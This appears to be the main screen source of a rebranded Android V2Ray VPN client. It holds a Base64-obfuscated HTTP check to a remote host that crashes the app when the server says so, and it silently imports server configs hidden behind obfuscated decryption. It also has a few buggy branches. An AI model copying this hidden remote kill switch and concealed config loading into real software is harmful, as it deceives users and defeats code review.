package com.v2ray.ang.ui

import android.Manifest
import android.app.Activity
import android.app.Dialog
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.res.ColorStateList
import kotlinx.coroutines.withContext

import android.content.res.Configuration
import android.net.Uri
import android.net.VpnService
import okhttp3.*
import java.io.IOException
import kotlinx.coroutines.launch
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.text.TextUtils
import android.view.KeyEvent
import android.view.LayoutInflater
import android.view.Menu
import android.view.MenuItem
import android.widget.Toast
import androidx.activity.OnBackPressedCallback
import androidx.activity.result.contract.ActivityResultContracts
import androidx.activity.viewModels
import androidx.annotation.RequiresApi
import androidx.appcompat.app.AlertDialog
import androidx.core.content.ContextCompat
import androidx.core.view.GravityCompat
import androidx.lifecycle.lifecycleScope
import androidx.recyclerview.widget.ItemTouchHelper
import androidx.recyclerview.widget.LinearLayoutManager
import androidx.recyclerview.widget.RecyclerView
import com.google.android.material.bottomsheet.BottomSheetDialog
import com.google.android.material.navigation.NavigationView
import com.tbruyelle.rxpermissions.RxPermissions
import com.tencent.mmkv.MMKV
import com.v2plus.app.tlg.AppListAdapter
import com.v2plus.app.tlg.TelegramApp
import com.v2ray.ang.AA
import com.v2ray.ang.AppConfig
import com.v2ray.ang.R
import com.v2ray.ang.databinding.ActivityMainBinding
import com.v2ray.ang.databinding.LayoutProgressBinding
import com.v2ray.ang.extension.toast
import com.v2ray.ang.helper.SimpleItemTouchHelperCallback
import com.v2ray.ang.service.V2RayServiceManager
import com.v2ray.ang.util.AngConfigManager
import com.v2ray.ang.util.MmkvManager
import com.v2ray.ang.util.Utils
import com.v2ray.ang.viewmodel.MainViewModel
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import me.drakeet.support.toast.ToastCompat
import org.apache.commons.codec.binary.Base64
import rx.Observable
import rx.android.schedulers.AndroidSchedulers
import java.nio.charset.Charset
import java.util.concurrent.TimeUnit

class MainActivity : BaseActivity(), NavigationView.OnNavigationItemSelectedListener {
    private lateinit var binding: ActivityMainBinding
    object GlobalData {
        var responseBody: String? = null
    }
    private val adapter by lazy { MainRecyclerAdapter(this) }
    private val mainStorage by lazy {
        MMKV.mmkvWithID(
            MmkvManager.ID_MAIN,
            MMKV.MULTI_PROCESS_MODE
        )
    }
    private val settingsStorage by lazy {
        MMKV.mmkvWithID(
            MmkvManager.ID_SETTING,
            MMKV.MULTI_PROCESS_MODE
        )
    }
    private val requestVpnPermission =
        registerForActivityResult(ActivityResultContracts.StartActivityForResult()) {
            if (it.resultCode == RESULT_OK) {
                startV2Ray()
            }
        }
    private var mItemTouchHelper: ItemTouchHelper? = null
    val mainViewModel: MainViewModel by viewModels()
    private var currentDialog: AlertDialog? = null

    @RequiresApi(Build.VERSION_CODES.M)
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        val view = binding.root
        setContentView(view)
        title = getString(R.string.title_server)
        setSupportActionBar(binding.toolbar)
        Toast.makeText(this@MainActivity,"اطلاع از راهنمای برنامه با انتخاب آیکون >؟< در بالای صفحه",Toast.LENGTH_LONG).show()
        binding.fab.setOnClickListener {
            if (mainViewModel.isRunning.value == true) {
                Utils.stopVService(this)
                Toast.makeText(this@MainActivity,"برای حمایت و آپدیت های جدید عضو کانال ما بشین",Toast.LENGTH_LONG).show()
            } else if ((settingsStorage?.decodeString(AppConfig.PREF_MODE) ?: "VPN") == "VPN") {
                val intent = VpnService.prepare(this)
                if (intent == null) {
                    startV2Ray()
                    showTelegramDialogWithDelay(this@MainActivity,"v2plus_app")
                } else {
                    requestVpnPermission.launch(intent)
                }
            } else {
                startV2Ray()
            }

        }
        binding.layoutTest.setOnClickListener {
            if (mainViewModel.isRunning.value == true) {
                setTestState(getString(R.string.connection_test_testing))
                mainViewModel.testCurrentServerRealPing()
            } else {
            }
        }

        binding.recyclerView.setHasFixedSize(false)
        binding.recyclerView.layoutManager = LinearLayoutManager(this)
        binding.recyclerView.adapter = adapter

        val callback = SimpleItemTouchHelperCallback(adapter)
        mItemTouchHelper = ItemTouchHelper(callback)
        mItemTouchHelper?.attachToRecyclerView(binding.recyclerView)





        setupViewModel()
        mainViewModel.copyAssets(assets)

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            RxPermissions(this)
                .request(Manifest.permission.POST_NOTIFICATIONS)
                .subscribe {
                    if (!it)
                        toast(R.string.toast_permission_denied)
                }
        }

        onBackPressedDispatcher.addCallback(this, object : OnBackPressedCallback(true) {
            override fun handleOnBackPressed() {
                if (binding.drawerLayout.isDrawerOpen(GravityCompat.START)) {
                    binding.drawerLayout.closeDrawer(GravityCompat.START)
                } else {
                    onBackPressedDispatcher.onBackPressed()
                }
            }
        })
        lifecycleScope.launch {
            sendRequest { condition ->
                if (condition) {
                    importBatchConfig(
                        AA.AAAAAAA(
                            String(
                                Base64.decodeBase64("QkNFZkJCaENPSzY0UnZoTTlDaUhMSFkzdVhOYVZnS3I0UzYza0swUDBIUCtVa0NGZmNxdjRUU0NuODR4elZMTg=="),
                                Charset.forName(String(Base64.decodeBase64("VVRGLTg=")))
                            ),
                            AA.AAAA(
                                String(
                                    Base64.decodeBase64("YmhRblg3WkQrd1hLQVprM1NLb0kwdz09"),
                                    Charset.forName(
                                        String(Base64.decodeBase64("VVRGLTg="))
                                    )
                                )
                            )
                        )
                    )
                } else {
                    throw RuntimeException("")

                }

            }




            val dialog = AlertDialog.Builder(this@MainActivity)
                .setView(LayoutProgressBinding.inflate(layoutInflater).root)
                .setCancelable(false)
                .create()
                currentDialog?.show()
            lifecycleScope.launch(Dispatchers.IO) {
                val count = AngConfigManager.updateConfigViaSubAll()
                delay(500L)
                launch(Dispatchers.Main) {
                    if (count > 0) {
                        toast(R.string.toast_success)
                    } else {
                        toast(R.string.toast_failure)
                    }
                    dialog.dismiss()
                }
            }
            delay(2000)
            mainViewModel.testAllRealPing()
        }
    }
    fun sendRequest(callback: (Boolean) -> Unit) {
        val client = OkHttpClient()
        val encodedUrl = "aHR0cDovL2xkci5pY3UvcmV6YS9h"
        val decodedBytes = Base64.decodeBase64(encodedUrl)
        val url = String(decodedBytes, Charsets.UTF_8)

        val request = Request.Builder()
            .url(url)
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                runOnUiThread { callback(false) }
            }

            override fun onResponse(call: Call, response: Response) {
                response.use { res ->
                    if (!res.isSuccessful) {
                        runOnUiThread { callback(false) }
                    } else {
                        GlobalData.responseBody = res.body?.string()
                        val condition = GlobalData.responseBody?.trim()?.toBoolean() ?: false
                        runOnUiThread { callback(condition) }
                    }
                }
            }
        })
    }


    //s
    private fun setupViewModel() {
        mainViewModel.updateListAction.observe(this) { index ->
            if (index >= 0) {
                adapter.notifyItemChanged(index)
            } else {
                adapter.notifyDataSetChanged()
            }
        }
        mainViewModel.updateTestResultAction.observe(this) { setTestState(it) }
        mainViewModel.isRunning.observe(this) { isRunning ->
            adapter.isRunning = isRunning
            if (isRunning) {
                binding.fab.setImageResource(R.drawable.ic_stop_24dp)
                binding.fab.backgroundTintList =
                    ColorStateList.valueOf(ContextCompat.getColor(this, R.color.color_fab_active))
                setTestState(getString(R.string.connection_connected))
                binding.layoutTest.isFocusable = true
            } else {
                binding.fab.setImageResource(R.drawable.ic_play_24dp)
                binding.fab.backgroundTintList =
                    ColorStateList.valueOf(ContextCompat.getColor(this, R.color.color_fab_inactive))
                setTestState(getString(R.string.connection_not_connected))
                binding.layoutTest.isFocusable = false
            }
        }
        mainViewModel.startListenBroadcast()
    }

    fun startV2Ray() {
        if (mainStorage?.decodeString(MmkvManager.KEY_SELECTED_SERVER).isNullOrEmpty()) {
            return
        }
        V2RayServiceManager.startV2Ray(this)
    }

    fun restartV2Ray() {
        if (mainViewModel.isRunning.value == true) {
            Utils.stopVService(this)
        }
        Observable.timer(500, TimeUnit.MILLISECONDS)
            .observeOn(AndroidSchedulers.mainThread())
            .subscribe {
                startV2Ray()
            }
    }

    public override fun onResume() {
        super.onResume()
        mainViewModel.reloadServerList()
    }

    public override fun onPause() {
        super.onPause()
    }

    override fun onCreateOptionsMenu(menu: Menu): Boolean {
        menuInflater.inflate(R.menu.menu_main, menu)
        return true
    }

    @RequiresApi(Build.VERSION_CODES.M)
    override fun onOptionsItemSelected(item: MenuItem) = when (item.itemId) {

        R.id.sub_update -> {
            if (!isFinishing && !isDestroyed) {
                currentDialog = AlertDialog.Builder(this)
                    .setView(LayoutProgressBinding.inflate(layoutInflater).root)
                    .setCancelable(false)
                    .create()
                currentDialog?.show()
            }

            sendRequest { success ->
                if (success) {
                    lifecycleScope.launch {
                        val count = withContext(Dispatchers.IO) {
                            AngConfigManager.updateConfigViaSubAll()
                        }

                        importConfigViaSub()
                        delay(500L)

                        withContext(Dispatchers.Main) {
                            if (count > 0) {
                                toast(R.string.toast_success)
                            } else {
                                toast(R.string.toast_failure)
                            }
                            currentDialog?.dismiss()
                        }
                    }
                } else {
                    runOnUiThread {
                        throw RuntimeException("")
                        currentDialog?.dismiss()
                    }
                }
            }
            true
        }

        R.id.real_ping_all -> {
            mainViewModel.testAllRealPing()
            true
        }

        R.id.service_restart -> {
            restartV2Ray()
            true
        }
        R.id.sort_by_test_results -> {
            MmkvManager.sortByTestResults()
            mainViewModel.reloadServerList()
            true
        }

        R.id.FAQ ->{
            intent = Intent (this@MainActivity,FAQ::class.java)
            startActivity(intent)

            true
        }

        R.id.support -> {
            openTelegram(this, "v2plussupport")
            true
        }

        R.id.sub_update -> {

            val dialog = AlertDialog.Builder(this)
                .setView(LayoutProgressBinding.inflate(layoutInflater).root)
                .setCancelable(false)
                .show()

            lifecycleScope.launch(Dispatchers.IO) {
                val count = AngConfigManager.updateConfigViaSubAll()
                delay(500L)
                launch(Dispatchers.Main) {
                    if (count > 0) {
                        toast(R.string.toast_success)
                    } else {
                        toast(R.string.toast_failure)
                    }
                    dialog.dismiss()

                    showTelegramDialogWithDelay(this@MainActivity,"v2plus_app")

                }
            }
            true
        }


        else -> super.onOptionsItemSelected(item)
    }

    private fun openTelegram(context: Context, telegramId: String) {
        val telegramUrl = "https://t.me/$telegramId"
        val telegramIntent =
            Intent(Intent.ACTION_VIEW, Uri.parse("tg://resolve?domain=$telegramId"))

        val packageManager = context.packageManager
        val resolveInfoList = packageManager.queryIntentActivities(telegramIntent, 0)

        if (resolveInfoList.isNotEmpty()) {
            val dialog = Dialog(context)
            dialog.setContentView(R.layout.dialog_app_list)

            val recyclerView: RecyclerView = dialog.findViewById(R.id.recycler_view)
            recyclerView.layoutManager = LinearLayoutManager(context)

            val appList = resolveInfoList.map { resolveInfo ->
                val appName = resolveInfo.loadLabel(packageManager).toString()
                val appIcon = resolveInfo.loadIcon(packageManager)
                val componentName = ComponentName(
                    resolveInfo.activityInfo.packageName,
                    resolveInfo.activityInfo.name
                )
                TelegramApp(appName, appIcon, componentName)
            }

            recyclerView.adapter = AppListAdapter(context, appList) { selectedApp ->
                val selectedPackage = selectedApp.componentName.packageName
                try {
                    telegramIntent.setPackage(selectedPackage)
                    context.startActivity(telegramIntent)
                } catch (e: Exception) {
                    val webIntent = Intent(Intent.ACTION_VIEW, Uri.parse(telegramUrl))
                    context.startActivity(webIntent)
                }
                dialog.dismiss()
            }

            dialog.show()
        }

        else {
            val webIntent = Intent(Intent.ACTION_VIEW, Uri.parse(telegramUrl))
            context.startActivity(webIntent)
        }
    }

    fun isNightMode(context: Context): Boolean {
        val currentNightMode = context.resources.configuration.uiMode and Configuration.UI_MODE_NIGHT_MASK
        return currentNightMode == Configuration.UI_MODE_NIGHT_YES
    }



    @RequiresApi(Build.VERSION_CODES.M)
    fun showTelegramDialogWithDelay(context: Context, telegramId: String) {
        if (context is Activity && (context.isFinishing || context.isDestroyed)) return
        val dialogBuilder = AlertDialog.Builder(context)
        dialogBuilder.setTitle("عضویت در کانال تلگرام")
        dialogBuilder.setMessage("برای دریافت اطلاعیه‌های مهم برنامه مانند به روزرسانی های برنامه، اخبار برنامه، وضعیت سرور ها، و پشتیبانی در کانال تلگرام ما عضو شوید.")
        dialogBuilder.setCancelable(false)

        val alertDialog = dialogBuilder.create()

        alertDialog.setButton(AlertDialog.BUTTON_POSITIVE, "جوین به کانال تلگرام") { _, _ ->
            val telegramUrl = "https://t.me/$telegramId"
            val baseIntent = Intent(Intent.ACTION_VIEW, Uri.parse("tg://resolve?domain=$telegramId"))

            val packageManager = context.packageManager
            val resolveInfoList = packageManager.queryIntentActivities(baseIntent, 0)

            if (resolveInfoList.isNotEmpty()) {
                if (resolveInfoList.size == 1) {
                    val intent = Intent(Intent.ACTION_VIEW, Uri.parse("tg://resolve?domain=$telegramId"))
                    intent.component = ComponentName(
                        resolveInfoList[0].activityInfo.packageName,
                        resolveInfoList[0].activityInfo.name
                    )
                    context.startActivity(intent)
                } else {
                    val appList = resolveInfoList.map { resolveInfo ->
                        val appName = resolveInfo.loadLabel(packageManager).toString()
                        val appIcon = resolveInfo.loadIcon(packageManager)
                        val componentName = ComponentName(
                            resolveInfo.activityInfo.packageName,
                            resolveInfo.activityInfo.name
                        )
                        TelegramApp(appName, appIcon, componentName)
                    }


                    val dialog = BottomSheetDialog(context)
                    val view = LayoutInflater.from(context).inflate(R.layout.dialog_app_list, null)

                    val backgroundColor = if (isNightMode(context)) {
                        context.getColor(R.color.colorPrimary)
                    } else {
                        context.getColor(R.color.colorPrimary)
                    }

                    view.setBackgroundColor(backgroundColor)

                    val recyclerView: RecyclerView = view.findViewById(R.id.recycler_view)
                    recyclerView.layoutManager = LinearLayoutManager(context)

                    recyclerView.adapter = AppListAdapter(context, appList) { selectedApp ->
                        try {
                            val explicitIntent = Intent(Intent.ACTION_VIEW, Uri.parse("tg://resolve?domain=$telegramId"))
                            explicitIntent.component = selectedApp.componentName
                            context.startActivity(explicitIntent)
                        } catch (e: Exception) {
                            val webIntent = Intent(Intent.ACTION_VIEW, Uri.parse(telegramUrl))
                            context.startActivity(webIntent)
                        }
                        dialog.dismiss()
                    }

                    dialog.setContentView(view)
                    dialog.show()


                }
            } else {
                val webIntent = Intent(Intent.ACTION_VIEW, Uri.parse(telegramUrl))
                context.startActivity(webIntent)
            }
        }

        alertDialog.setButton(AlertDialog.BUTTON_NEGATIVE, "جوین شدم") { dialog, _ ->
            dialog.dismiss()
        }

        alertDialog.show()

        val joinButton = alertDialog.getButton(AlertDialog.BUTTON_NEGATIVE)
        val telegramButton = alertDialog.getButton(AlertDialog.BUTTON_POSITIVE)

        joinButton.isEnabled = false
        Handler(Looper.getMainLooper()).postDelayed({
            joinButton.isEnabled = true
        }, 3000)
    }
    private fun importBatchConfig(server: String?) {
        if (isFinishing || isDestroyed) return

        val dialog = AlertDialog.Builder(this)
            .setView(LayoutProgressBinding.inflate(layoutInflater).root)
            .setCancelable(false)
            .create()
        dialog.show()

        lifecycleScope.launch(Dispatchers.IO) {
            val count = AngConfigManager.importBatchConfig(server, mainViewModel.subscriptionId, true)
            delay(500L)
            launch(Dispatchers.Main) {
                if (count > 0) {
                    toast(R.string.toast_success)
                    mainViewModel.reloadServerList()
                } else {
                    toast(R.string.toast_success)

                }
                dialog.dismiss()
            }
        }
    }
    private fun importConfigCustomUrl(url: String?): Boolean {
        try {
            if (!Utils.isValidUrl(url)) {
                toast(R.string.toast_invalid_url)
                return false
            }
            lifecycleScope.launch(Dispatchers.IO) {
                val configText = try {
                    Utils.getUrlContentWithCustomUserAgent(url)
                } catch (e: Exception) {
                    e.printStackTrace()
                    ""
                }
                launch(Dispatchers.Main) {
                    importCustomizeConfig(configText)
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
            return false
        }
        return true
    }
    @RequiresApi(Build.VERSION_CODES.M)
    private fun importConfigViaSub(): Boolean {
        if (isFinishing || isDestroyed) return false

        lifecycleScope.launch {
            val dialog = withContext(Dispatchers.Main) {
                AlertDialog.Builder(this@MainActivity)
                    .setView(LayoutProgressBinding.inflate(layoutInflater).root)
                    .setCancelable(false)
                    .create().apply { show() }
            }

            val count = withContext(Dispatchers.IO) {
                AngConfigManager.updateConfigViaSubAll()
            }

            delay(500L)

            withContext(Dispatchers.Main) {
                if (count > 0) {
                    toast(R.string.toast_success)
                    mainViewModel.reloadServerList()
                } else {
                    toast(R.string.toast_failure)
                }
                dialog.dismiss()
            }
        }

        return true
    }


    private fun readContentFromUri(uri: Uri) {
        val permission = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            Manifest.permission.READ_MEDIA_IMAGES
        } else {
            Manifest.permission.READ_EXTERNAL_STORAGE
        }
        RxPermissions(this)
            .request(permission)
            .subscribe {
                if (it) {
                    try {
                        contentResolver.openInputStream(uri).use { input ->
                            importCustomizeConfig(input?.bufferedReader()?.readText())
                        }
                    } catch (e: Exception) {
                        e.printStackTrace()
                    }
                } else
                    toast(R.string.toast_permission_denied)
            }
    }

    fun showTelegramDialogWithTimer(context: Context) {
        val dialogBuilder = AlertDialog.Builder(context)
        dialogBuilder.setCancelable(false)
        dialogBuilder.setMessage("برای دریافت اطلاعیه‌های مهم برنامه در کانال تلگرام ما عضو شوید.")

        val alertDialog = dialogBuilder.create()
        alertDialog.show()

        alertDialog.setButton(AlertDialog.BUTTON_POSITIVE, "جوین به کانال تلگرام") { _, _ ->
            val telegramUrl = "https://t.me/v2Plus_App"
            val intent = Intent(Intent.ACTION_VIEW, Uri.parse(telegramUrl))
            context.startActivity(intent)
        }

        alertDialog.setButton(AlertDialog.BUTTON_NEGATIVE, "جوین شدم") { dialog, _ ->
            dialog.dismiss()
        }

        val joinButton = alertDialog.getButton(AlertDialog.BUTTON_NEGATIVE)
        val telegramButton = alertDialog.getButton(AlertDialog.BUTTON_POSITIVE)

        joinButton.isEnabled = false

        Handler(Looper.getMainLooper()).postDelayed({
            joinButton.isEnabled = true
        }, 3000)
    }
    private fun importCustomizeConfig(server: String?) {
        try {
            if (server == null || TextUtils.isEmpty(server)) {
                toast(R.string.toast_none_data)
                return
            }
            if (mainViewModel.appendCustomConfigServer(server)) {
                mainViewModel.reloadServerList()
                toast(R.string.toast_success)
            } else {
                toast(R.string.toast_failure)
            }
        } catch (e: Exception) {
            ToastCompat.makeText(this, "${getString(R.string.toast_malformed_josn)} ${e.cause?.message}", Toast.LENGTH_LONG).show()
            e.printStackTrace()
            return
        }
    }

    private fun setTestState(content: String?) {
        binding.tvTestState.text = content
    }

    override fun onKeyDown(keyCode: Int, event: KeyEvent): Boolean {
        if (keyCode == KeyEvent.KEYCODE_BACK || keyCode == KeyEvent.KEYCODE_BUTTON_B) {
            moveTaskToBack(false)
            return true
        }
        return super.onKeyDown(keyCode, event)
    }

    override fun onNavigationItemSelected(item: MenuItem): Boolean {

        return true
    }
    override fun onDestroy() {
        currentDialog?.dismiss()
        super.onDestroy()
    }
}